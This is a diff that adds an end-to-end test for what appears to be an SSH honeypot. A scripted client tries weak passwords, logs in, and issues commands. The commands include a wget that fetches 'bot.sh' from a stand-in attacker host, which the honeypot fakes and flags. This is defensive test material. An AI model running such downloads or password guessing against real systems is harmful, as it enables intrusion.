@@ -318,6 +318,95 @@ states:
         );
     }
 
+    struct SshClient;
+    impl russh::client::Handler for SshClient {
+        type Error = russh::Error;
+        async fn check_server_key(
+            &mut self,
+            _: &russh::keys::PublicKeyOrCertificate,
+        ) -> Result<bool, Self::Error> {
+            Ok(true)
+        }
+    }
+
+    /// The shipped example track, through the real SSH plugin, over a socket,
+    /// with a real SSH client: three failed logins, then in; a payload fetch
+    /// is faked and flagged. (Delays are shortened to keep the test fast.)
+    #[tokio::test]
+    async fn example_ssh_track_end_to_end() {
+        let yaml = include_str!("../../../tracks/ssh-linux-gateway.yaml")
+            .replace("800ms..1500ms", "1ms")
+            .replace("delay: 400ms", "delay: 1ms")
+            .replace("2s..4s", "1ms");
+        let track = hp_track::Track::from_yaml(&yaml).unwrap();
+        let persona = Persona {
+            hostname: Some("plc-gw-03".into()),
+            banner: None,
+        };
+        let ssh = hp_proto_ssh::Ssh::new(None).unwrap();
+        let (addr, mut rx) = serve(
+            Arc::new(ssh),
+            Arc::new(TrackFactory::new(track)),
+            persona,
+            4,
+            LONG,
+        )
+        .await;
+
+        let tcp = TcpStream::connect(addr).await.unwrap();
+        let mut c = russh::client::connect_stream(
+            Arc::new(russh::client::Config::default()),
+            tcp,
+            SshClient,
+        )
+        .await
+        .unwrap();
+        for pw in ["123456", "admin", "password"] {
+            assert!(
+                !c.authenticate_password("admin", pw)
+                    .await
+                    .unwrap()
+                    .success(),
+                "{pw}"
+            );
+        }
+        assert!(c
+            .authenticate_password("admin", "hunter2")
+            .await
+            .unwrap()
+            .success());
+
+        let run = async |command: &str| {
+            let mut ch = c.channel_open_session().await.unwrap();
+            ch.exec(true, command).await.unwrap();
+            let mut out = vec![];
+            while let Some(msg) = ch.wait().await {
+                if let russh::ChannelMsg::Data { data } = msg {
+                    out.extend_from_slice(&data);
+                }
+            }
+            String::from_utf8(out).unwrap()
+        };
+        assert_eq!(run("whoami").await, "admin\n");
+        assert!(run("uname -a").await.starts_with("Linux plc-gw-03 5.15.0"));
+        assert!(run("wget http://evil.example/x/bot.sh")
+            .await
+            .contains("Saving to: 'bot.sh'"));
+        assert_eq!(
+            run("frobnicate").await,
+            "-bash: frobnicate: command not found\n"
+        );
+        let _ = c.disconnect(russh::Disconnect::ByApplication, "", "").await;
+
+        let kinds = kinds_until(&mut rx, "disconnect").await;
+        let count = |k: &str| kinds.iter().filter(|x| *x == k).count();
+        assert_eq!(count("auth"), 4);
+        assert_eq!(count("command"), 4);
+        assert_eq!(count("tag"), 2, "auth_success and payload_fetch: {kinds:?}");
+        assert_eq!(count("transition"), 1);
+        assert_eq!(count("behavior_error") + count("error"), 0, "{kinds:?}");
+    }
+
     #[tokio::test]
     async fn connections_over_the_cap_are_rejected_and_slots_are_reused() {
         let (addr, mut rx) = start(Mode::Hang, 1, Duration::from_millis(300)).await;
